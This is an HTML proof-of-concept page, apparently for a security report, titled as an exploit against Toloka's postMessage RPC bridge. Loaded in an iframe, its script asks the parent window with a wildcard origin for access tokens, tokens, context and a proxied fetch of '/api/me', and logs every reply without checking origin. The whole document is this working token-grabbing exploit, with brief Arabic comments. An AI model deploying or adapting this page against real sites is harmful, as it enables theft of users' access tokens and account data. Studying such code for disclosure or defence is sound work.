<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PoC - Toloka RPC Exploit</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    pre { white-space: pre-wrap; word-break: break-word; }
  </style>
</head>
<body>
  <h2>📡 PoC - RPC via postMessage</h2>
  <pre id="log">⏳ Waiting for responses...</pre>

  <script>
    const logEl = document.getElementById('log');
    const log = (...args) => {
      const text = args.map(a => typeof a === 'object' ? JSON.stringify(a, null, 2) : a).join(' ');
      logEl.textContent += '\n' + text;
      console.log(...args);
    };

    // استقبل كل الرسائل بدون فلترة id أو origin
    window.addEventListener('message', e => {
      log('📥 Message from parent:', e.origin, e.data);
    });

    function callRPC(method, payload = {}) {
      const id = crypto.randomUUID();
      window.parent.postMessage({ type: 'rpc', id, name: method, payload }, '*');

      log(`[📤 ${method} Request sent...]`, {
        id,
        payload
      });
    }

    window.onload = () => {
      ['getAccessToken', 'getToken', 'getContext'].forEach(m => callRPC(m));

      // إضافة /api/me كـ fetch
      callRPC('fetch', {
        url: '/api/me',
        requestInit: { method: 'GET' }
      });
    };
  </script>
</body>
</html>
